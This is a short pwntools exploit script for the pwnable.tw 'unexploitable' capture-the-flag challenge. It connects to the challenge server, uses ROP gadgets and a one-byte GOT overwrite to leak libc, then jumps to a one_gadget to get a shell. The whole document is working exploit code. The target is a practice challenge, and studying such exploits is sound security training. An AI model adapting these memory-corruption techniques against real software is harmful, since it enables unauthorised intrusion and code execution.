#Exploit for pwnable.tw/unexploitable
from pwn import *
import time

elf = ELF("./unexploitable")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

LOCAL = 0

def conn():
	if LOCAL:
		return process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
	else:
		return remote('chall.pwnable.tw', 10403)

target = conn()

#0x0000000000400604 : add rsp, 0x38 ; ret
add_rsp   = p64(0x400604)
full_read = p64(0x40055b)
call_read = p64(0x400571)

got = 0x601000	#read, __libc_start_main, sleep

sleep_time = 3

target.send("BLAH"*4 + p64(got + 0x18 + 8) + full_read)
time.sleep(sleep_time)
target.send(p64(got + 0x60) + add_rsp + p64(got + 0x10) + full_read + "C"*0x28 + call_read + p64(got + 0x10) + full_read + "\x00"*0x80)
time.sleep(sleep_time)
target.send("\x7e")
time.sleep(sleep_time)

libc_base = u64(target.recv(8)) - libc.sym['read'] - 0xe
log.info("LIBC Base: " + hex(libc_base))
gadgets = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
target.sendline("JUNK"*6 + p64(libc_base + gadgets[2]))

target.interactive()